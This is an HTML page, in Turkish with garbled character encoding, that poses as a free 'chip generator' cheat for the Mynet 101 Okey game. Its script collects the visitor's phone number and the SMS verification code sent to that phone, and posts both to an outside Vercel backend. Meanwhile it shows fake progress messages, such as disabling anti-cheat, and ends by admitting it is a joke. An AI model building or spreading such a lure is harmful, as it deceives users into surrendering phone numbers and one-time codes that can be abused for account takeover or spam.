<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>101 Ã‡ANAK â€¢ Ã‡Ä°P GENERATOR v999</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Oxanium:wght@600;800&family=VT323&display=swap');

    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      min-height: 100vh;
      background: radial-gradient(circle at center, #0d001a 0%, #000 80%);
      color: #e9d5ff;
      font-family: 'Oxanium', sans-serif;
      overflow-x: hidden;
    }
    .container {
      max-width: 540px;
      margin: 40px auto;
      padding: 40px 30px;
      background: rgba(15, 5, 50, 0.65);
      border: 2px solid #b19cd9;
      border-radius: 20px;
      box-shadow: 0 0 60px rgba(177, 156, 217, 0.35);
      backdrop-filter: blur(10px);
    }
    h1 { text-align: center; font-size: 3rem; background: linear-gradient(90deg, #c084fc, #e9d5ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    label { font-size: 1.5rem; display: block; margin-bottom: 10px; color: #d7c0ff; }
    input { width: 100%; max-width: 360px; padding: 15px; font-size: 1.8rem; background: rgba(30,10,70,0.7); border: 2px solid #9d4edd; border-radius: 10px; color: white; text-align: center; font-family: 'VT323', monospace; }
    .btn { padding: 15px 60px; font-size: 1.6rem; background: linear-gradient(45deg, #7c3aed, #c084fc); border: none; border-radius: 50px; color: white; cursor: pointer; margin: 20px auto; display: block; text-transform: uppercase; letter-spacing: 2px; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .status { min-height: 200px; font-family: 'VT323', monospace; font-size: 1.4rem; color: #b19cd9; white-space: pre-line; margin-top: 20px; text-shadow: 0 0 5px rgba(177,156,217,0.5); }
    .hidden { display: none; }
    .footer { text-align: center; margin-top: 40px; color: #a78bfa; opacity: 0.7; font-size: 1.1rem; }
  </style>
</head>
<body>

<div class="container">
  <h1>Ã‡Ä°P GENERATOR</h1>
  <div style="text-align:center; color:#a78bfa; margin:20px 0; font-size:1.2rem;">Mynet 2026 â€“ SMS DoÄŸrulamalÄ± Unlimited</div>

  <div class="input-group">
    <label>Telefon NumaranÄ±zÄ± Girin (+90 ile)</label>
    <input type="text" id="phoneInput" placeholder="+905xxxxxxxxx" maxlength="13" autocomplete="off" />
  </div>

  <div class="input-group" id="chipGroup" style="display:none;">
    <label>Ã‡ip MiktarÄ±nÄ± Gir</label>
    <input type="text" id="chipInput" placeholder="999999999999" autocomplete="off" />
  </div>

  <button class="btn" id="sendBtn" disabled>Ã‡Ä°PLERÄ° GÃ–NDER</button>

  <div class="input-group hidden" id="otpGroup">
    <label>Telefona Gelen DoÄŸrulama Kodunu Gir</label>
    <input type="text" id="otpInput" placeholder="123456" maxlength="10" autocomplete="off" />
    <button class="btn" id="verifyBtn">DOÄžRULA KODU</button>
  </div>

  <div class="status" id="statusText"></div>

  <div class="footer">Generated By RÃ¼zgar Seyit GÃ¶ngÃ¶r</div>
</div>

<script>
  const phoneInput = document.getElementById('phoneInput');
  const chipGroup = document.getElementById('chipGroup');
  const sendBtn = document.getElementById('sendBtn');
  const status = document.getElementById('statusText');
  const BACKEND_URL = 'https://okey-hile-twilio-backend.vercel.app'; // Vercel URL'nizi buraya yapÄ±ÅŸtÄ±rÄ±n (veya uzun versiyonunu)

  phoneInput.addEventListener('input', () => {
    const val = phoneInput.value.trim().replace(/\D/g, '');
    if (val.length >= 10) {
      sendBtn.disabled = false;
      chipGroup.style.display = 'block';
    } else {
      sendBtn.disabled = true;
      chipGroup.style.display = 'none';
    }
  });

  sendBtn.addEventListener('click', async () => {
    const phone = phoneInput.value.trim();
    const amount = document.getElementById('chipInput').value.trim() || '999999999999';

    status.innerHTML = 'GÃ¶nderiliyor...\nSunucuya eriÅŸiliyor...\nAnti-cheat devre dÄ±ÅŸÄ± bÄ±rakÄ±lÄ±yor...\nSMS gÃ¶nderiliyor...';

    try {
      const res = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'send', phone })
      });
      const data = await res.json();

      if (data.success) {
        status.innerHTML += '\nGerÃ§ek doÄŸrulama kodu SMS ile gÃ¶nderildi!\nTelefona gelen kodu aÅŸaÄŸÄ±ya girin.';
        document.getElementById('otpGroup').classList.remove('hidden');
      } else {
        status.innerHTML += '\nHata: ' + (data.error || 'Bilinmeyen sorun');
      }
    } catch (err) {
      status.innerHTML += '\nBaÄŸlantÄ± hatasÄ±: ' + err.message;
    }
  });

  document.getElementById('verifyBtn').addEventListener('click', async () => {
    const phone = phoneInput.value.trim();
    const code = document.getElementById('otpInput').value.trim();

    if (!code) {
      status.innerHTML += '\nLÃ¼tfen kodu girin!';
      return;
    }

    status.innerHTML += '\nDoÄŸrulanÄ±yor...';

    try {
      const res = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'verify', phone, code })
      });
      const data = await res.json();

      status.innerHTML += data.success 
        ? `\n${data.message}\nÄ°ÅŸlem tamamlandÄ± âœ“\nLobiye dÃ¶n ve bakiyeni kontrol et (ÅŸaka tabii ðŸ˜„)`
        : `\n${data.message || data.error}`;
    } catch (err) {
      status.innerHTML += '\nDoÄŸrulama hatasÄ±: ' + err.message;
    }
  });
</script>

</body>
</html>
